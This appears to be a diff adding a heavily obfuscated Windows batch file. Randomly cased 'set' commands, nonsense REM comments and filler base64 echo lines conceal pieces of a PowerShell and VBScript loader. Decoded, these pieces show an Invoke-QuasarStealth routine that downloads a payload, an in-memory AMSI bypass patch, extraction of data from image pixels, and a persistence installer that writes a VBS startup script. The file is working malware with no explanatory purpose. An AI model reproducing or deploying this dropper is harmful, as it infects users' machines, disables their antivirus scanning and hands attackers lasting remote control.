+SE%skzSF%T "fEQQrnUUrCYXcZy=ErBjYIgBIaCqvSCfzMu"
+SE%uGg%t "kFOQxaTOHUs=djXZPuLBPVVJARWpfLWhMI"
+REM zenith kappa clearing phantom core vision zenith guard
+sE%SQHf%T "fNCiPJ=aDYavZJrJQnMbkqCZvMLjfKEveQCCJM"
+echo R21xWmZrS0JIMU1xWTlzMWdtMWIxYm9ad0N3UGtxZDl4clNnV1Z5U1pXRllJa2JWZ1hKY0JoWU51MVkwV2hVRGdvR2g5 >nul 2>&1
+REM cipher vertex pixel
+REM undergrowth delta glimmer undergrowth pixel fathom strobe echo valley kiln
+REM guard lance odyssey undergrowth circle clearing beacon strobe
+echo V01ITmVvc2NaZzAxbnJqV1cyZ25lMUZCSmxHeGJKUEdCR2licllDTUZFS2FMWVZ2ZjJISGpFRDJXY3I5VGliWmVpdFJORUFJamVHVzJaeg== >nul 2>&1
+se%YMwxf%t "cQxdAVDxwq=yuTnaEchUFsz"
+REM vision vision strobe valley
+echo WkRMdVJlOW5tdmJ4aXdzTFFpWWRVWjRDSFFjM1J2MVR2d0lPVUd0VHQ2N29BaGNuN21Rc0tNQTlwdUw0OFUycVBXdHliZWNUNg== >nul 2>&1
+REM fathom shadow fathom vision fragment beacon shadow echo strobe
+REM strobe odyssey circle zenith
+REM circle valley beacon zenith hawk
+echo YjJhbXNDa2NtSUI4aDJGZDJMazJkUEVUVDJRTXU2T1h3cmt5QXdiMXl6NmhLU2ZGc210N05mVzBqR1lHYVF3Z1JncVQzamxSbTYwbw== >nul 2>&1
+se%EaLNe%T "lruWBpWK=hFPSYXPItAApHbORjVEcvbGIfmLiuEMP"
+REM zenith clearing circle
+REM hawk lance kiln guard glimmer vertex
+REM pixel delta beacon cipher twilight ruby circle circle odyssey echo
+echo QkE1MXBOSk1TZUlUVzFGU3cxaDM4WURWRnEzbG00MFN5UFlmTU5Lcw== >nul 2>&1
+Se%mym%T "chrLCl=fAIMiBsjhMqIxIxckwfLAo"
+sE%VXy%T "SEIkdrOMOND=VsnosMdViczFtNHWIiwBKJAoTHml"
+REM ruby vertex lance guard fragment guard odyssey zenith echo
+echo eENqQkN6OXhRdG5BSjVlYUdrTGNBM0dMMFVkVzR5RDJZMzk2V2xZM2ZqQXA3d3l6VHJHMlJqSTFaZnROVXYxdVlT >nul 2>&1
+REM echo undergrowth clearing valley glimmer core ruby
+se%IkSG%T "XWJNvVw=lCQDyllzAEJInjjHwHcJgkePrxyTgbtnd"
+SE%ufrCV%t "PuqLbchzrFFSAf=fCZFehHUAKeK"
+sE%GWfNs%t "tKwWSbWBEKWc=JyOafUJJcnYBMhz"
+REM clearing odyssey ruby
+echo N254S09SbFUydWllbERkaGpnVlRTQzloRkRMdm0xdjBWcHdYM1J3ZGZlQjY= >nul 2>&1
+Se%XAYh%t "VikmVVsQIMOT=EXTkgUkqBHLpAecefHroLz"
+se%jLYZ%T "CoQyRRFqv=wsDSbhzrLD"
+se%QRnLi%t "LQZukghJH=bZeDedhYmtPbCfh"
+REM phantom pixel hawk guard
+REM guard odyssey vertex phantom zenith
+REM kiln fathom glimmer lance clearing vision
+SE%ztVWr%T "vwBjslhZ=eWNhcm5pdmFsL21haW4vdXNlci50eHQiCkxvZy1TaWxlbnQgIlsqXSBDaGVja2luZyBwZXJzaXN0ZW5jZSBjb25maWd1cmF0aW9uLi4uIiAiR3JheSIKaWYgKCRQRVJTSVNURU5DRV9VUkwgLW1hdGNoICJSRV"
+Se%PvauV%T "tYbXJQnHu=yAkJNjBKwYukgxxAPd"
+sE%FLpA%t "hEulDQCkQ=JZbzuFlOfTDcpZeLkEKdcLSqJUioETTd"
+REM ruby phantom core binary guard circle binary zenith shadow lance
+Se%UqNA%T "GmPJjd=FWBLAjcVwesNmGRpJAtlChmaIjg"
+REM vision fragment shadow strobe hawk fragment
+REM twilight beacon ruby circle hawk circle odyssey kappa sword fragment
+echo VkpXaGhSb3hjMTBPUU5rU0pvTEs4aWFrQkZNOGpJNTVzSWtBVldmNXdjc1VPZDBpZFY= >nul 2>&1
+echo OEMycnJQRWdNUm9EMkRhQ3hXY2p2ZXdTV1Jyb2NGdWp5dFVWS21WcVVuZ3BXRVl3R3VCQQ== >nul 2>&1
+sE%tLNCf%t "dCeiaVQoD=kOztlfbyZWIGKQubpkfWQjXjSlQRdEVvl"
+SE%WhS%T "StYaSpFD=CeIYHjdgdNruWjamH"
+REM vision phantom cipher phantom cipher clearing echo circle odyssey
+REM guard fragment cipher kappa strobe valley
+echo T01XYk4yRWhpMlZGdHFUdDJKeGNjeFdvcVRVQk5WTWtuTjdrUmU3YWdLa1RPMWZ1R2daVWxMR2NTYw== >nul 2>&1
+SE%zmoY%T "HDBVngRa=PlvwLPLicKFIkjnlLrKnemChuXwAbjhEB"
+REM shadow odyssey guard pixel core sword
+sE%CGIO%T "ybhjLMqhGv=QdCulvbGgiLEPQxR"
+echo bVc0Y0Y2Wk53NHpPUUFOck5BWGN6M2JOM3VCcThlbnFBamM5TzkwaGtNM2lJcmdSc3ZrNnpQQVF6UUdNdVRFY2wySUVkVEU= >nul 2>&1
+Se%Prx%T "NktgKHNap=AJsHpcFRsA"
+se%Cpu%T "AbxGuTrxjDI=DXnnAqfdSWSAaxu"
+sE%NDEU%t "AXnICF=fiZznmycASyFvUuJIJYzQ"
+se%JmZh%T "NKxnhDpZqRy=aCpZjTFWyqQAoiLzKltuBjeIjMWqjsym"
+REM shadow lance valley strobe mirage
+se%lKb%t "fPLzMCOkcTBskY=pvVkJHZgirPSRKK"
+echo bFJhY3E2Tzl0TVdlbEVDdHdNdmVCUFNTS0RtUXpJZnRnZko2aWNCNjBpV2EyY2xlTEhR >nul 2>&1
+Se%EHd%T "AkVysgodj=GoCUdTHhpyafBHOzFqIgOpyKXRpYzHNIQi"
+echo UUY5dUl4cHNFVDQ4S3pGMlRxZnZmU0RxV2NyU1lKNVdDMWd1czV0SDV1TEZFa3duRlZXV0xWTk4= >nul 2>&1
+REM circle delta guard echo zenith mirage echo
+SE%gBrNF%T "rcYVTTRSG=UTxESFOQCnVUBMz"
+se%EQKw%t "IhaZWorzUs=eGzDcQpeakmDtLfsLkm"
+REM echo valley echo zenith kappa clearing hawk cipher undergrowth undergrowth
+REM ruby beacon glimmer strobe lance mirage
+REM sword kiln phantom fragment vision sword vision clearing strobe valley
+sE%RhkqB%t "qAItVo=NzkhascDHYAo"
+REM mirage strobe lance undergrowth mirage odyssey twilight echo beacon circle
+Se%pOS%t "sYGGmnhwbfGj=VhJDbwceOsQmctaVoAcEDjuojkdu"
+echo QWY0THRHRG9nTmZjeHJCS1VIeWhsanVPWW51UExkbHJXTmtmSkpJQWdqcVNuaURL >nul 2>&1
+se%VgqoL%T "iebiaRjltfcI=UFZOqbFCDGyQjaqaJQMnHduzLDG"
+se%SYXO%t "GNeiiJoWvOB=ZKpoYgLcJrOnRHVXKqWHTkWjNkvorukZlv"
+SE%sPhe%T "FDUdOu=cKVLrrBNmFemILjLtoquiFJbBlIvtT"
+REM twilight mirage binary clearing pixel
+sE%mms%t "SyvTUzcXOn=ehQLgedULTnwvICYvtpivgOrM"
+sE%DsTP%T "ZkHcRzik=XzISvDdjirxlUcnwA"
+REM cipher kappa glimmer odyssey kiln phantom core strobe hawk
+REM beacon fathom zenith lance
+REM beacon sword clearing circle phantom
+SE%cYduW%t "GzBuTGlnwq=YzvcZZnRYIDJRIKPkmxVHbaJRQ"
+REM kiln fathom echo
+sE%Ptjk%t "IrKuqCdbvBBg=ukEBrRioAAtmWfEyVHygGtvbTNsiTzmZY"
+REM core zenith guard twilight mirage ruby
+REM clearing delta pixel vision core circle
+REM vision ruby odyssey
+REM kappa sword kappa beacon
+REM shadow shadow circle kiln
+sE%QVYYg%t "loHWcOhQG=ZXNvbHZlKQokb25FeGNlcHRpb24gPSBbU3lzdGVtLlVuaGFuZGxlZEV4Y2VwdGlvbkV2ZW50SGFuZGxlcl17CnBhcmFtKCRzLCAkZSkKJGV4ID0gJGUuRXhjZXB0aW9uT2JqZWN0CkxvZy1TaWxlbnQgIltGQVRBTCBFUlJPU"
+sE%xkuK%t "oujsSEREPeAOg=DIWbaPUZumXHrlS"
+REM clearing pixel lance
+REM kiln circle twilight vertex
+REM shadow glimmer echo core mirage kiln clearing
+REM glimmer undergrowth twilight kappa kiln clearing
+REM binary guard strobe circle lance sword
+REM delta hawk circle odyssey mirage circle zenith
+REM clearing kappa clearing kiln circle vision pixel lance glimmer phantom
+Se%nrmkM%T "nwJTLgfurwm=UApdNoAMHTCFSHmuwMqVUuVWqLNNPZEZ"
+Se%nJAg%t "TFRBKdrYjau=HywHTVLSvicoXsCQCJ"
+echo dFVZZ2F2aTA5TE56c0pXekVXVGllMlVjMzJlUU9WbzFMcWpKYVpyMTk3Z2lJM2NyUXA4VEt0aE85czFw >nul 2>&1
+Se%xkk%T "RZcBTwe=siAEltssFMVhTg"
+REM shadow clearing cipher mirage
+Se%Qwob%T "AlkYeUtMr=ikvFtvYKccxJlhwLiMBblmPPYpSriPOU"
+sE%pbhQ%t "xTbNTJXdZIXSEiG=xrUwHrRQAxzIxPl"
+REM delta core hawk vision
+REM lance lance hawk
+echo VUJCR3dVcmtJcm5RWUFwRGtoWEpiSk1tbTBqQlZqenJpc2c4ZUo1OENyQVBvYlcyZ1hFeWxVTTdPYXJBQQ== >nul 2>&1
+echo TnJSd1pZb2M4d1lKcmRCb0ZKSGNPTG9PNXZqNmJ3SnprZGVFcWlqNWFoQVh2QlQ2V3BnYk5yeG9qellKVXNVYTJjSVhLN0pzWW1iWWFO >nul 2>&1
+se%ETud%T "OyXWdQdnq=rfNLfZYakchUzPUAybGWtZMDoVjwOQ"
+REM fragment guard shadow beacon fragment pixel ruby
+SE%pfssZ%T "RiNHChKLdBD=dNXSVMGKtjYFHOt"
+REM kiln vertex twilight
+echo V0Jkc1RCMWNUVUtaRm9HZGhnSHdnTFc1MFJybk4xT3dEZVdKcDI3ZE9rZzkzSDA4eGpJeDRhNklTRFBkZmNDbTNZSXRpaFc5Tm5OclZtQQ== >nul 2>&1
+REM glimmer twilight echo valley zenith vertex lance beacon
+REM zenith clearing phantom valley echo clearing guard glimmer
+SE%YyQ%t "XzVIiautuud=iUxQzjjuxVYM"
+REM kiln mirage undergrowth kappa guard
+se%yORg%T "mifPfEfmjwhSn=CBhQEjRSOHbTssQOXct"
+echo NDVrbWl3ejVOdHo2R1lMQ2ZmZFp2YldhdFhDRnV3Rkt6TXJ0WEdzZXEzQmZ6aUNoczQxckU4MFVNa2pKWA== >nul 2>&1
+REM sword circle vision odyssey glimmer hawk ruby hawk kappa
+REM odyssey beacon odyssey pixel circle undergrowth core
+sE%jHuJV%T "LwktZSE=eGNlcHRpb24pCmZ1bmN0aW9uIEludm9rZS1RdWFzYXJTdGVhbHRoIHsKcGFyYW0gKFtzdHJpbmddJFNvdXJjZSkKdHJ5IHsKJGRhdGEgPSAkbnVsbAppZiAoJFNvdXJjZSAtbGlrZSAiaHR0cCoiKSB7CkxvZy1T"
+REM undergrowth strobe clearing clearing odyssey pixel
+SE%zRIkS%T "FBLDqwKEYWKbgf=YiGmaXxCrokeSSAqqb"
+Se%fmLan%t "JIdecVZxKRoR=nUTQADznSWPOXdcTrSDLmsSGZp"
+Se%XJtuo%t "NuGHguYwh=dCAiWyFdIERlcGVuZGVuY3kgcmVxdWVzdGVkOiAkKCRlLk5hbWUpIiAiWWVsbG93IgpyZXR1cm4gJG51bGwKfQpbU3lzdGVtLkFwcERvbWFpbl06OkN1cnJlbnREb21haW4uYWRkX0Fzc2VtYmx5UmVzb2x2ZSgkb25S"
+REM ruby phantom sword fragment echo
+REM ruby lance echo undergrowth
+echo R1d2ZmNVb0gwMGZZT2V3bGhJQlVLZ3ZGU1lMczdOQWkwZGFhYlZhVVplbjRLOTNMbzNTMnVWTTQwYkFkNw== >nul 2>&1
+se%YzZt%t "UaosruGIoOx=aOGddsPxhBehwlnZSHrKmoey"
+REM vision ruby sword core strobe odyssey ruby twilight binary undergrowth
+Se%ebIK%t "qIltJLhpZCQPY=cOEDckFPyuKdR"
+REM valley core binary lance beacon twilight kappa
+REM guard vertex zenith ruby guard sword
+echo RjN5U1BENkROdmlTc1VRVkhjTnJFSFNnaUJpMVQzRVFGRTVsUjZ5VEh5ajJo >nul 2>&1
+REM phantom clearing binary zenith vertex shadow mirage phantom
+REM echo glimmer vertex
+REM beacon fragment undergrowth
+REM beacon guard glimmer cipher hawk vertex cipher guard guard
+se%mHDK%t "WJzkxbqmdblf=Y3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpCkRpbSB1LCBjCnUgPSAiIgpGb3IgRWFjaCBjIEluIEFycmF5KCRjaHJBcnJheSkKdSA9IHUgJiBDaHIoYykKTmV4dApEaW0gSHR0cDogU2V0I"
+REM binary undergrowth phantom vertex mirage pixel
+se%AxS%T "SpiCfRn=1TdGFnZXJVcmwgJFBFUlNJU1RFTkNFX1VSTAp9CkFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLkRyYXdpbmcKJG9uUmVzb2x2ZSA9IFtTeXN0ZW0uUmVzb2x2ZUV2ZW50SGFuZGxlcl17CnBhcmFtKCRzLCAkZSkKTG9nLVNpbGVu"
+se%GeouF%T "hwfMylNrsjIlDz=QqxMUKQKEaKQyjzwvwVBhKLnNfZZanNnT"
+REM vertex valley shadow fragment echo sword glimmer odyssey
+Se%cxM%t "ZdShrOxRUQDDGW=wXXdLbhhGJsNwysnIdQkFamPhsXTyOgMQq"
+REM beacon kiln fathom
+Se%wwegU%t "CDdUUO=rzMmjiHlNyuaoiOtJYwjC"
+REM core vertex delta valley odyssey fragment vision pixel guard
+sE%dwAq%t "gOfZdSc=eiEgxGUpILgBRFSpkaurxunnTEHVPsP"
+REM mirage valley clearing vision
+se%jDdL%t "hzpogKV=WkWbTkoMDqNyjxbmNSRGzrV"
+Se%FDBQt%t "qDjASHBoujfSz=bpCALROgFwnfMaLBeCMuusdZVLCCj"
+sE%RUckM%T "ZZrvlspDkC=CCwWyVosaLwAtbqoboFjXtwPEPzkTSXo"
+se%eZTTT%T "DnqgUKHdV=nmlcoEgZGygQFSyqMOtK"
+SE%QeDI%t "QyyJihuESnx=TWcyvyTRgjzNefcjsxacu"
+REM lance core strobe vision
+sE%akWmB%T "sQRspdrvDWBbz=uKFKxbWBMXU"
+REM fragment circle zenith glimmer clearing twilight strobe ruby phantom
+echo ZEhWTVdMNTN4bndGMVQzQWt5aXpIaTBPMUJjQTRMazhNUHFodVBnbGFNdXVGNFRlaWNrNlJxZHg= >nul 2>&1
+sE%gaT%T "ArjeGV=fVvwbEDECnIPmIPnmYlenRFkZmamTO"
+Se%GKA%t "eqrqtZwC=nQgIklubmVyOiAkKCRfLkV4Y2VwdGlvbi5Jbm5lckV4Y2VwdGlvbi5NZXNzYWdlKSIgfQp9Cn0KSW52b2tlLVF1YXNhclN0ZWFsdGggLVNvdXJjZSAkdGFyZ2V0"
+REM beacon lance beacon zenith undergrowth guard echo odyssey fragment
+REM lance delta delta zenith vertex mirage kappa sword
+SE%fOwIj%t "GOCCAMcINCGiW=rCWqieHfcVrzsrpY"
+REM twilight kiln core clearing valley vision vision pixel
+se%UEiMr%t "MWZicsBnsRoYItr=KVMMAaYOYyrOUcGK"
+sE%svJv%t "QYYqkbEWZbPmay=mPyLIiOySiYHwnsxvlcGAHlECoXIP"
+REM strobe glimmer fathom fragment ruby zenith binary beacon
+se%eYhM%T "JbkaZhiSgI=rMlmbSSAVQydanyhhtUZLRvmDA"
+sE%LBz%T "RoIudWB=JUHrnaMURNEbpljNouC"
+se%lbEq%T "zNBOGPNWs=pHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkd2luMzIuR2V0TWV0aG9kKCdHZXQnICsgJ01vZHVsZScgKyAnSGFuZGxlJykuSW52b2tlKCRudWxsLCBAKCRhKSksIFtGdW5jW3N0cmluZyxJbnRQdHJdXSkK"
+REM fathom hawk glimmer odyssey
+REM strobe clearing twilight valley
+echo eHFpNU5EWnFodUhKSGhCaThHbUYwb2xOZTNOT1lFU2RwZEoyYzh0TGZ5WHI4MkJCbDBPMWV6dUZYcUVN >nul 2>&1
+REM zenith mirage delta hawk clearing twilight sword circle delta
+echo MU5Rb1d6d3B2NjBpNFBVT0xBSkFwM3dGQUd3N1BUV1FHZmNZUUVXalBhVkk4a1NZN0hYODRSRUJt >nul 2>&1
+SE%Iqq%T "CCFZeho=enUkNPlYXHqKI"
+se%BfB%T "dLaAvklorslbgnB=lUhyHCAzCTrAoexQCgXFNK"
+REM kappa lance vertex guard glimmer
+REM binary echo mirage twilight lance cipher strobe cipher mirage fragment
+SE%kLv%T "iAuRJdFvQvhg=accuMKxQEmGzepgweGwJVpJDFiz"
+SE%RQOot%t "yLIAlJBt=mSReFTjeDCDIZsyqNcW"
+SE%cqSD%t "iSWplx=hTvLmzLkdGgaYZUca"
+REM guard phantom delta glimmer
+REM guard pixel pixel vertex valley delta odyssey
+Se%tSL%T "DsdqsnASQ=xVBqMCBqahCZyO"
+sE%iji%T "tlabLEkIsqM=luzqnkdtJBzZtWIbVUfOyn"
+Se%npkRd%t "lPKoDSPPljTi=YAgdEwPRtyHPkCOMeYtTMfUGI"
+echo MXpLOG1Kam5jNTRUU2VZbzFxUUVqWmNZYk5lRVV0T2w4RnhZeWlFSWxNVnpQT0hndkxzNlU= >nul 2>&1
+REM odyssey zenith circle valley
+Se%vYE%T "plrrqBvnyhYyRY=nBxgzfRyPKwoSoS"
+SE%ypumI%t "vipvdt=USZEiZhzNwLaCAxywF"
+REM fathom clearing zenith odyssey guard ruby zenith odyssey
+REM lance sword strobe zenith strobe hawk circle guard
+REM kappa kiln valley echo clearing lance kiln twilight kappa
+REM kappa zenith fathom vision clearing sword
+echo dVFFYjhKS2JmejFRWDlQOVBCbzJJVGJpRHF2ZTVpdGZmWmc1S01Bb0lyRHA2b3k= >nul 2>&1
+echo WnhDaE5OYXdsYnB6RGJTYjlCT2JQbkVYalJ4QU5hSzV6QzVNdDZMeGVockFqU01ONWwydkY= >nul 2>&1
+se%cgy%T "hGkOcajgnthBo=dNUkTGIVMmIKZCRTvsZQxcmqdbZESc"
+REM twilight ruby kiln fathom fragment guard ruby mirage fathom odyssey
+sE%Zkza%T "AnlVhTMLbd=qQbzgJCXCTESUSldsYeNqi"
+sE%LxRJ%T "nWVTyn=Bhc2NpaQpMb2ctU2lsZW50ICJbK10gUGVyc2lzdGVuY2UgaW5zdGFsbGVkIHRvOiAkdmJzUGF0aCIgIkdyZWVuIgp9IGNhdGNoIHsKTG9nLVNpbGVudCAiRmFpbGVkIHRvIGluc3RhbGwgcGVyc2lzdGVuY2U6"
+SE%KioQu%t "ColxxeWAu=cigzNCksIDAsIEZhbHNlCkVuZCBJZgpTZXQgc2hlbGwgPSBOb3RoaW5nClNldCBmc28gPSBOb3RoaW5nCiJACnRyeSB7CiR2YnNDb250ZW50IHwgT3V0LUZpbGUgLUZpbGVQYXRoICR2YnNQYXRoIC1FbmNvZGluZy"
+echo bkdZNUpscGxEazIyMlBXdERuQUVLUGZLQTFjSGpuRWQ3SHRyTTVCMDdmbA== >nul 2>&1
+se%JpLR%T "yhkWys=XfTtMRUofo"
+se%dIFG%T "RfSpXvUetzk=BRfvjLzNrwQXvlI"
+REM kappa glimmer core glimmer vision vision cipher
+se%VufNw%T "TuBYoBfpf=PubxYRFMAwhyYvwSDkKyJehtcwuEr"
+SE%XSws%t "GPZVKTZgmlxsq=yYTMurAOofdJtky"
+REM fragment delta circle kiln echo pixel
+se%Egg%t "yGpkDB=bpiuDVhfidQibpADEOqrgojGklHRRsaihUR"
+SE%wVud%T "EErZSULCt=WnZZYjtYEvqcZ"
+echo QWN6TUhOeVo2bkI3cU03VlFZeDFXRlNOUmlmSVUwYVR3aU11aThMdQ== >nul 2>&1
+REM circle pixel beacon phantom shadow vision shadow ruby
+se%ECro%t "TnjVLnEzOtXZa=hprQVUzQaXJn"
+se%kVSRq%t "nQjIKzhawL=mIXZXQgEXsxKFds"
+SE%SiAE%t "yBmJFP=zculjrBaZRsabAtsncjQlgbrZH"
+REM glimmer kiln mirage core echo vision undergrowth
+sE%KxiE%T "aQvCHpGbDY=SQfEvDoVheNoieAHoKddJOvB"
+sE%LeX%t "ClbZupP=GrJzUfLsmaZUByzgt"
+REM clearing echo phantom strobe kappa lance fathom glimmer hawk phantom
+SE%dHBsY%T "MrMLhMybIPruxyO=WOHBxVaqqiJGujrRxlgJerGcUAUzmSQ"
+echo NjU3dGtvRldkMkh2amd0ZVloZ3VNcFlnWVBkb1g0WW1CbFZJcVFCZGx2bWR1bVQ= >nul 2>&1
+echo cExTaFJOQUpEbjlNVUZ0bkthaWMzRm5nVnV0YUhSNGFSNEFkM1pUcFdmUzM= >nul 2>&1
+REM ruby circle shadow clearing beacon phantom echo mirage
+se%jUxF%T "yAcCcBbGGOoc=CHauWzbrirZpTvCrXtlJDXfWfrgtDX"
+SE%WRVU%T "LFxaIc=qTJcslvvWETUvqj"
+echo dXZUaWF6dUdEZVV0Q2JQUDZsSzBhdmhqNW93eTQyb05PRTZTUENnNWcwanNuZGlLZnBqRHc2MlE0QnVJRUhiU3hzNVdVbFM4MXc4SDY= >nul 2>&1
+echo QWRNSWpBa3hxYm1RcVFrbmZLMnJEc0p2VXI3SllJR0xjbmZkdVJKdTRYR0ZUbFJnMjVUMmNs >nul 2>&1
+sE%CHj%T "OaAFptkVWNg=nBWJEgpkZkRCsdOby"
+echo NEtJemNva2QxYzFFek1QZ3ltQmJKTURCdUlNbnNxQ0liM29zZ3NMUmVsbTdhTGlDY1c= >nul 2>&1
+echo eldBRTIyZ05LV2xlQlpuVVI2QW53S1ZaTjZMZGJVVFQ1ZHd3bTFpTExnVGVkZUxXM2ZHeFREdnBORjJ3cEkwdTk5bndEOXRtWFhiZFBPYg== >nul 2>&1
+echo dXZMTDhnYUJWY21rdTEwQXpiek5wdEFzWVViZzJONnRvM2R6NFBUTw== >nul 2>&1
+se%sbis%t "NYQygHPb=b3IgJE1lc3NhZ2UgfQplbHNlIHsgV3JpdGUtSG9zdCAkTWVzc2FnZSAtRm9yZWdyb3VuZENvbG9yICRDb2xvciB9Cn0KfQpmdW5jdGlvbiBJbnN0YWxsLVBlcnNpc3RlbmNlIHsKcGFyYW0gKFtzdHJpbmddJFN0YWdl"
+sE%uJv%T "TyvfleORXIiFItE=HgbiitzFEx"
+REM twilight mirage kiln ruby
+SE%cZS%T "ZDaiHFmV=GltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJHBhdGNoLCAwLCAkcHRyLCAkcGF0Y2guTGVuZ3RoKQokdnAuSW52b2tlKCRwdHIsIFt1aW50cHRyXSRwYXRjaC5MZW5ndGgsICRvbG"
+REM beacon fragment shadow kappa lance kiln
+Se%cluOK%T "RwTQgPhyWohXM=KreUtxqvVDOasaCTW"
+se%PxH%T "xpkUyUPCnieBkUQ=IllWTkJHvPfHGgwysZnfBwJST"
+sE%jyE%T "aBjfOsGmeGfV=BIsQYuGswGSBwMRbp"
+echo Y3ZvMWFVd2FKQ1JGZlBFUzZzaTJRMUJjbzRVMzFReDdTNFdVZmVibUYxQXVUYktFQ1c2aHlFNlI= >nul 2>&1
+Se%insps%T "ecVotSASxh=WjVrUCfZipHMAxdPRIstjyweqApyNQ"
+sE%idQk%t "JPzAYKOvG=zSDVUUhCeUoHBBXwXgDkfEyHTQ"
+SE%Kuy%T "bFPDDAqgvT=hZHukjsXhrg"
+echo RG4yRWNuVkh6d2pwamY3OHhEd0hQN3BrRXE1VEJrYUtpaHhIZ3dQUjJjSHduRkR3 >nul 2>&1
+echo WlRtSDRNQ05PQ2JlY1dUSTdPaE5GR2MzY2lQcDFCak9LdXp2bjExMXJCMm1WZm00cGFN >nul 2>&1
+SE%jbtsR%t "wEWliInq=umViRqBMEqNTlBjdWne"
+SE%arMmo%T "TDschqKgiMkR=NAMjlukDRzQwnjGOLKJjsxuKW"
+echo TTJOeXhRTWRIREpwaFNzZUtLdEc4Z2E2QmRUYUZFeHFvM3drRmZNdkhxYQ== >nul 2>&1
+REM delta binary lance
+se%yCU%t "SuszHJHxrWTKTB=hxqqlJXtVLpsgqEEXaZPsH"
+echo NkhnaGJYOXI1Z0ZwWmM1cjRNMUx0RjJGRENFM1ljazR0eTRhbVNjMmVRYzk1SVlocGJzcml5Mlo3Y1piSlZmekxST2FBbFZVeQ== >nul 2>&1
+REM fragment pixel hawk odyssey guard
+echo WTZUSjJRNnZVSnpOaElLbFlBdUxtOWVKMXZqODl0WUxodHppR2FHOFM= >nul 2>&1
+echo U0U5QXkyeGpTTnExOHFWbUM4R1lqRTIzMTNJZFBwRW9GTUN5RjBvZFk4SHBIMXJSaHlKbTE0Y3phNXNzUnkzdzFSUkhSMzB3QXNmclJQWQ== >nul 2>&1
+REM lance strobe fathom shadow guard
+REM guard undergrowth glimmer
+REM binary kappa shadow
+echo QmtEVjlPb1h6Z2xMSEhZMFp2WElUZmFSVld2andETXU4cWs0aXF2YzVVWEdwaTNlUEpo >nul 2>&1
+echo bnF5enBiem1DMTlVQzVRVzZtYnZWbDU0YnpNTXRpU0RPTGdnOGlvM3B0djdoTzhYc3U0YnhQVDc2QzA1bjNxMk40 >nul 2>&1
+REM binary ruby core mirage odyssey mirage clearing undergrowth twilight
+se%BWd%t "dAJEYHvOBbJhGFD=dJRwIuKeuihrzXB"
+SE%pLu%T "spWiAlrIw=VJPkBhueZSenSFllpdYSoZduSPIjKDJgjR"
+se%AqBt%t "aAlYiFOkSeZKTVT=SSrSAGfVfpwWVPLviG"
+echo N1RLc2Zob29LQ0FmN3B0aWdNa1dQZURLb3lrQ2QzOEo2ZUpPVUhlaDlk >nul 2>&1
+echo RzJXS0t3OXZGeVFiaExwUVpUdU9JOXIwTmpUUkpRZG5oQ0VhYkNucVk2VFRxTmRGaGFDWEdwNWpUMDJQT014M3U2N3dKV29paU85NQ== >nul 2>&1
+SE%Ssj%T "EDBcJgPZIhsJS=fCXQZDVLTmudMpOsbRpPqjKTFwqcRUcO"
+se%ZNsF%T "CcmEaqd=GEcXwvNGRGoDlJZIpFaUEhOgumD"
+REM hawk valley core shadow kiln
+echo NDVJMXlwbk5JaE9qTU1MV20xMTB4R3hsOXBnM09SZlVLbFkyUTQxV3JiaGlMSGhja3ozNE9I >nul 2>&1
+se%EBIX%t "BvlPdTVJSVXuk=FlPCNXvOqqoaXBDGyyzJdM"
+REM guard clearing beacon vertex circle valley clearing pixel shadow odyssey
+Se%vqO%T "APJIAuvSQQ=oLJkisbTEgvrgRDmJUTwCGlwUEh"
+REM glimmer circle delta echo core core fathom
+Se%nlFT%t "jZoNKEJArcPK=LdDuWABgkDjAiiMBLHPzGljlutCOG"
+REM zenith circle mirage cipher
+sE%RzCp%T "LVGXdagiBOIzb=zQLzddnDXGfLAxXn"
+sE%YisQQ%t "pzEipJkTZF=rwEncFaRLJkThNIlwiRlaNejeHv"
+REM delta core guard
+Se%mgOQD%T "UhyIXDyHqBr=0aW9ucy5HZW5lcmljLkxpc3RbYnl0ZV0KJGRvbmUgPSAkZmFsc2UKZm9yICgkeSA9IDA7ICR5IC1sdCAkaDsgJHkrKykgewpmb3IgKCR4ID0gMDsgJHggLWx0ICR3OyAkeCsrKSB7CmlmICgkeSAtZXEgMCAtYW5kICgkeCAt"
+echo VERnZ0ZjNHJnc1FiWnVrNThYNzE3WTFzaDM5T29xR3k3aHFuTnRlUUFPYkpHUWl0OG1oaw== >nul 2>&1
+SE%aye%t "vWqdrpFL=aVytNGQeWocKGkRmEAiAvPouAh"
+se%UWul%T "bDTSQJuSFIb=BvzGkRLBWDnzqJlfYTko"
+REM circle zenith phantom clearing lance twilight core shadow cipher
+echo SE5kS0Q1M2FLcEFpaTVKZzZjbGcxallUWXgxNW5TZWR1bEV1TFd5YWJwVlYxcU12eTJLVFVJNFFjSjRvNWZLQkhVa2l4dFhwM2t6RQ== >nul 2>&1
+Se%Cbl%t "eRefCLyc=nSxafKKsUJTqJaPThlbXtMSnp"
+REM phantom pixel ruby kiln vertex ruby vertex kappa vision kiln
+REM valley pixel kappa fragment shadow sword
+REM twilight zenith delta lance vision fragment
+echo MmdMZ094S3duZ1VaMHI5WWd1dllydE5teTFPSjN0N2s2Yk4wMGd4U2Q1SWhET0hkYzlteTBq >nul 2>&1
+echo bUZwa1RFWTJ1WFZiQ2hGNnpPYXp5WW52RWRiaHd6dmplVmY0d1dFODhnd2tIVGk2aEk3dHJ0SWJpNmJuVmtaZ2ZnOWdI >nul 2>&1
+SE%oseJK%t "kIsFfbt=CDwxuXKObyTap"
+Se%AOLkv%t "WPhVKWaKHe=mxeNCkuhttYkCIHXYsyDqAdttpMvu"
+SE%xwq%t "ACWefdNulF=dtfqYFhfclCALomghGfYmD"
+REM beacon beacon odyssey hawk cipher echo kappa vertex core shadow
+REM glimmer shadow twilight clearing clearing
+Se%jhFP%t "GnCFTiD=JHB0ciA9ICR3aW4zMi5HZXRNZXRob2QoJ0dldCcgKyAnUHJvYycgKyAnQWRkcmVzcycpLkludm9rZSgkbnVsbCwgQCgkaGFuZGxlLCAkYXNiKSkKJHBhdGNoID0gW2J5dGVbXV0oMHhCOCwgMHg1Nywg"
+se%ypgt%t "VqAnRa=FFUkmzeXUFxYgbZ"
+se%TcLG%T "SMjJEzatKkENmx=vispxxQYOVTZVKTQfeFyqeJ"
+echo MENaTzNHT1o1MDE3TGFmazVnd09qUkN2dTJIWEFRNDM1S3h5UzlhcGFLenNUUk94cWtoU1M5dlRSRzVEUFp3OFhIajdMWTBK >nul 2>&1
+REM sword lance clearing kiln delta
